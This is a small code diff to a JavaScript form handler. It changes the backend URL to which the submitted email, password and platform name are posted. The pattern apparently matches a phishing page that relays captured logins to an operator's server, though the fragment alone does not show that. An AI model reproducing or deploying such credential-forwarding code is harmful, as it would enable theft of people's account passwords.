@@ -25,7 +25,7 @@ async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://akamubackend.onrender.com/api/send', {
+        const response = await axios.post('https://mainbackendd.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
